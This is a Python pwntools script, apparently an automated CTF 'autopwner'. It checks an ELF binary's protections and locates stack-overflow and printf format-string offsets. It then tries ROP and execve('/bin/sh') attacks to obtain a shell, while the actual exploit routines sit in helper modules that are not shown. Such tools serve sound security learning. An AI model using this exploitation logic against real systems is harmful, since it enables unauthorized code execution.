from pwn import *
from autopwner_helpers import *
from autopwner_exploits import *
import sys
import time

challenge_info = {}

binary_name = sys.argv[1]
elf = ELF(binary_name)

challenge_info["binary_name"] = binary_name
challenge_info["elf"] = elf

bytes_in_an_address = 4
pack_int = p32
if (elf.bits == 64):
    bytes_in_an_address = 8
    pack_int = p64
print(elf.bits)

offset_to_ebp, num_junk_inputs_for_smashing = determine_offset_to_ebp(challenge_info)
offset_to_return_address = offset_to_ebp + bytes_in_an_address

printf_offset, num_junk_inputs_for_printf = determine_printf_offset(binary_name)

challenge_info["bytes_in_an_address"] = bytes_in_an_address
challenge_info["pack_int"] = pack_int
challenge_info["offset_to_ebp"] = offset_to_ebp
challenge_info["num_junk_inputs_for_smashing"] = num_junk_inputs_for_smashing
challenge_info["offset_to_return_address"] = offset_to_return_address
challenge_info["printf_offset"] = printf_offset
challenge_info["num_junk_inputs_for_printf"] = num_junk_inputs_for_printf

use_stack_smashing = True

if (not elf.canary) and (num_junk_inputs_for_smashing != -1): # overflow definitely exists
    print("Will use stack smashing")
    print(offset_to_return_address)
    print(num_junk_inputs_for_smashing)
elif num_junk_inputs_for_printf != -1: # printf vulernability exists
    print("Will use a printf vulnerability")
    print(printf_offset)
    use_stack_smashing = False
elif num_junk_inputs_for_smashing != -1: # overflow may work
    print("Canary exists, but will attempt stack smashing")
    print(offset_to_return_address)
    print(num_junk_inputs_for_smashing)
else:
    print("This binary is not compatible!")
    exit()

challenge_info["use_stack_smashing"] = use_stack_smashing

if (not elf.relro) or (elf.relro == "Partial"):
    print("Attempting sledgehammer")
    shell_achieved = sledgehammer(challenge_info)
    if (shell_achieved):
        exit()

execve_gadgets = find_execve_gadgets(binary_name)
challenge_info["execve_gadgets"] = execve_gadgets

if not elf.pie and execve_gadgets != -1:
    print(execve_gadgets)
    print('Attempting execve("/bin/sh")')
    shell_achieved = execve_bin_sh_data_section(challenge_info)
    if (shell_achieved):
        exit()

if not elf.nx: # and stack_leak_exists_or_possible
    print("Attempting shellcode on stack")
    #if (shell_achieved):
        #exit()

# if win_function exists:
    # print("Attempting to use a win function")
    #if (shell_achieved):
        #exit()

print("This binary is not compatible!")

